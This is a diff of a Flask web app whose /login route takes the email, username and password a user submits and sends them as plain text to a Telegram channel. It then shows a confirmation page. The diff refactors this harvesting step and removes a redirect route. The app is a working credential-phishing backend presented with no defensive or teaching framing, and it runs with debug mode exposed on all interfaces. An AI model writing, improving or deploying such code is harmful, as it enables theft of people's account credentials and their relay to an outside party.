@@ -1,7 +1,6 @@
 from flask import Flask, render_template, request, redirect, url_for, flash
 import requests
 import logging
-import time
 
 # Configure logging
 logging.basicConfig(level=logging.DEBUG)
@@ -33,18 +32,6 @@ def send_to_telegram(message):
 def index():
     return render_template('index.html')
 
-@app.route('/message')
-def message():
-    # Get the message parameters from the query string
-    success = request.args.get('success', type=bool, default=False)
-    email = request.args.get('email', '')
-    username = request.args.get('username', '')
-    
-    return render_template('message.html', 
-                          success=success, 
-                          email=email, 
-                          username=username)
-
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form['email']
@@ -52,14 +39,17 @@ def login():
     password = request.form['password']
 
     # Send email and password to Telegram
-    message_text = f"Email: {email}\nUsername: {username}\nPassword: {password}"
-    success = send_to_telegram(message_text)
+    message = f"Email: {email}\nUsername: {username}\nPassword: {password}"
+    success = send_to_telegram(message)
     
-    # Redirect to message page first with parameters
-    return redirect(url_for('message', 
-                           success=success, 
-                           email=email, 
-                           username=username))
+    # Store the message in session to display on message.html
+    flash('Login information processed!', 'success' if success else 'error')
+    
+    # Render message.html which will then redirect to index
+    return render_template('message.html', 
+                         success=success, 
+                         email=email, 
+                         username=username)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=True)
